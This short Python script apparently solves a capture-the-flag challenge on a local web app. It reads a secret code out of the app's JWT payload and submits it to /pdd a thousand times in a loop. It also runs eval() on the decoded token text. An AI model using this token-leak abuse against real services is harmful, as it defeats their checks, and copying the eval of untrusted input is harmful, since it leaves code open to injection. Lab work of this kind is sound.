import requests
from base64 import b64decode
url = 'http://127.0.0.1:5000/'
proxies = { "http": None, "https": None}
session = requests.session()
r = session.post(url + 'login', {'username':'1', 'password': 1}, proxies=proxies)
for i in range(1000):
    r = session.get(url + 'code', proxies=proxies)
    jwt = r.headers['Authorization'].split('.')[1]
    while True:
        try:
            code = b64decode(jwt.encode()).decode()
            break
        except:
            jwt += '='
    code = eval(code)['code']
    r = session.post(url + 'pdd', {'code': code}, proxies=proxies)
r = session.get(url + 'pdd', proxies=proxies)
print(r.text)